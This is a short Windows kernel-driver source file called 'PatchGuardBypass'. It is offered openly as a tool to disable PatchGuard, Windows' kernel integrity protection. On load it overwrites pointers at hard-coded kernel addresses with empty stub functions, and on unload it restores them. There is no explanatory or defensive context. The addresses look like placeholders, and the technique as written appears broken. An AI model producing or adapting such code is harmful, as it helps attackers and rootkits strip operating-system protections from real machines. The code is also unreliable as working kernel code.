#include <ntddk.h>


typedef struct _HOOKED_FUNCTIONS {
    PVOID OriginalKiFilterFiberContext;
    PVOID OriginalExQueueWorkItem;
} HOOKED_FUNCTIONS, *PHOOKED_FUNCTIONS;

HOOKED_FUNCTIONS HookedFunctions;

VOID DummyKiFilterFiberContext() {
}

VOID DummyExQueueWorkItem(PWORK_QUEUE_ITEM WorkItem, WORK_QUEUE_TYPE QueueType) {
}

VOID HookPatchGuardFunctions() {
    PVOID KiFilterFiberContextAddress = (PVOID)0xFFFFF80000012345;
    PVOID ExQueueWorkItemAddress = (PVOID)0xFFFFF80000067890;

    HookedFunctions.OriginalKiFilterFiberContext = InterlockedExchangePointer(
        (PVOID*)KiFilterFiberContextAddress, DummyKiFilterFiberContext);

    HookedFunctions.OriginalExQueueWorkItem = InterlockedExchangePointer(
        (PVOID*)ExQueueWorkItemAddress, DummyExQueueWorkItem);
}


VOID UnhookPatchGuardFunctions() {

    PVOID KiFilterFiberContextAddress = (PVOID)0xFFFFF80000012345;
    PVOID ExQueueWorkItemAddress = (PVOID)0xFFFFF80000067890;

    InterlockedExchangePointer(
        (PVOID*)KiFilterFiberContextAddress, HookedFunctions.OriginalKiFilterFiberContext);

    InterlockedExchangePointer(
        (PVOID*)ExQueueWorkItemAddress, HookedFunctions.OriginalExQueueWorkItem);
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);


    UnhookPatchGuardFunctions();

    DbgPrint("PatchGuardBypass: Unloaded\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = UnloadDriver;


    HookPatchGuardFunctions();

    DbgPrint("PatchGuardBypass: Loaded\n");
    return STATUS_SUCCESS;
}
